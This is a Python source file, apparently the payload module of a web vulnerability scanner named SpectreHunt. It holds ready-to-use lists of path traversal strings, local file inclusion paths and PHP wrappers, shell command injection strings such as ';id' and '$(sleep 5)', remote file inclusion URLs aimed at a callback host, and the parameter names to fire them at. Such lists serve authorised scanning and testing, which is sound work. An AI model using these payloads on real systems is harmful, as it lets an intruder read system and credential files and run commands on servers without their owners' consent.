"""
SpectreHunt :: payloads/default.py
Stack-aware payload families. "generic" returns the union so a misdetected
stack costs wasted requests instead of missed findings.

Author : Inayat Hussain
"""

from config import RCE_MARKER, RFI_PAYLOAD_FILENAME

TRAVERSAL_LINUX = [
    "../../../../../../etc/passwd", "../../../../../etc/passwd",
    "../../../../etc/passwd", "../../../etc/passwd",
    "../../etc/passwd", "../etc/passwd", "/etc/passwd",
]
TRAVERSAL_WINDOWS = [
    r"..\..\..\..\..\windows\win.ini", r"..\..\..\..\windows\win.ini",
    r"..\..\..\windows\win.ini", r"..\..\..\..\boot.ini",
    r"..\..\..\..\windows\system32\drivers\etc\hosts",
    "C:/Windows/win.ini", r"C:\Windows\win.ini", "C:/boot.ini",
]
TRAVERSAL_ENCODED = [
    "....//....//....//....//etc/passwd", "..//..//..//..//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "..%255c..%255c..%255cwindows%255cwin.ini",
    "..%c0%af..%c0%af..%c0%afetc/passwd", "..;/..;/..;/etc/passwd",
    "/etc/./passwd", "/etc//passwd",
]
TRAVERSAL_SUFFIX = [
    "/etc/passwd%00", "/etc/passwd%00.jpg", "/etc/passwd%0a",
    "/etc/passwd?", "/etc/passwd/.", "/etc/passwd/..",
    "/etc/passwd%2500", "win.ini%00", "web.config%00",
]

LFI_LINUX = [
    "/etc/passwd", "../../../../../../etc/passwd", "../../../../etc/passwd",
    "../../../etc/passwd", "../etc/passwd", "/proc/self/environ",
    "/proc/self/cmdline", "/proc/self/cwd/index.php", "/proc/version",
    "/etc/hostname", "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf",
    "/var/log/apache2/access.log",
]
LFI_WINDOWS = [
    r"..\..\..\..\windows\win.ini", r"..\..\..\..\boot.ini",
    "C:/windows/win.ini", r"C:\windows\win.ini",
    r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\machine.config",
    "/windows/win.ini", "win.ini", "boot.ini",
]
LFI_ASPNET = [
    "web.config", "../web.config", "../../web.config", "App_Data/",
    "index.aspx", "default.aspx", "Global.asax", "bin/", "App_Code/",
]
LFI_JAVA = [
    "WEB-INF/web.xml", "/WEB-INF/web.xml", "../../WEB-INF/web.xml",
    "WEB-INF/classes/", "..;/WEB-INF/web.xml", "META-INF/MANIFEST.MF",
]
LFI_PHP = [
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/read=string.rot13/resource=index.php",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/convert.base64-encode/resource=../config.php",
    "php://input", "expect://id",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
]
LFI_GENERIC = [
    "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "/etc/passwd%00", "/etc/passwd?",
]

RCE_UNIX = [
    f";echo {RCE_MARKER}", f"|echo {RCE_MARKER}", f"||echo {RCE_MARKER}",
    f"&&echo {RCE_MARKER}", f"`echo {RCE_MARKER}`", f"$(echo {RCE_MARKER})",
    f"%0aecho {RCE_MARKER}", f";echo {RCE_MARKER};",
    f";echo${{IFS}}{RCE_MARKER}", f";echo%09{RCE_MARKER}",
    ";id", "|id", "&&id", "$(id)", "`id`", ";whoami", ";uname -a",
    ";sleep 5", "$(sleep 5)",
]
RCE_WINDOWS = [
    f"&echo {RCE_MARKER}", f"|echo {RCE_MARKER}", f"||echo {RCE_MARKER}",
    f"%0aecho {RCE_MARKER}", f"%26echo {RCE_MARKER}",
    "&whoami", "|whoami", "&&whoami", "%0awhoami", "&set", "&dir", "& ver",
    "& type C:\\Windows\\win.ini", "& ping -n 2 127.0.0.1",
]

RFI = [
    "http://{cb}/" + RFI_PAYLOAD_FILENAME,
    "http://{cb}/" + RFI_PAYLOAD_FILENAME + "?",
    "http://{cb}/" + RFI_PAYLOAD_FILENAME + "%00",
    "//{cb}/" + RFI_PAYLOAD_FILENAME,
    "https://{cb}/" + RFI_PAYLOAD_FILENAME,
    "http://{cb}/" + RFI_PAYLOAD_FILENAME + "?c=id",
    "ftp://{cb}/" + RFI_PAYLOAD_FILENAME,
]


def _dedupe(*groups):
    out = []
    for group in groups:
        for item in group:
            if item not in out:
                out.append(item)
    return out


def build_payloads(stack: str = "generic", os_family: str = "linux") -> dict:
    stack = (stack or "generic").lower()
    os_family = (os_family or "linux").lower()

    primary_os = TRAVERSAL_WINDOWS if os_family == "windows" else TRAVERSAL_LINUX
    other_os = TRAVERSAL_LINUX if os_family == "windows" else TRAVERSAL_WINDOWS
    traversal = _dedupe(primary_os, TRAVERSAL_ENCODED, other_os, TRAVERSAL_SUFFIX)

    lfi_primary = LFI_WINDOWS if os_family == "windows" else LFI_LINUX
    lfi_other = LFI_LINUX if os_family == "windows" else LFI_WINDOWS

    if stack == "generic":
        extras = _dedupe(LFI_PHP, LFI_ASPNET, LFI_JAVA)
    else:
        extras = {"php": LFI_PHP, "aspnet": LFI_ASPNET, "java": LFI_JAVA}.get(stack, ())

    lfi = _dedupe(lfi_primary, extras, lfi_other, LFI_GENERIC)
    rce = _dedupe(RCE_WINDOWS if os_family == "windows" else RCE_UNIX,
                  RCE_UNIX if os_family == "windows" else RCE_WINDOWS)

    return {"lfi": lfi, "traversal": traversal, "rce": rce, "rfi": list(RFI)}


def build_probes(payloads: dict) -> dict:
    return {k: v[:5] for k, v in payloads.items()}


PAYLOADS = build_payloads("generic", "linux")
PROBE_PAYLOADS = build_probes(PAYLOADS)

HIDDEN_PARAMS = [
    "page", "file", "path", "id", "cat", "dept", "nid", "pid",
    "doc", "download", "cmd", "exec", "action", "q", "s", "name",
    "type", "f", "p", "url", "redirect", "view", "content", "inc",
]
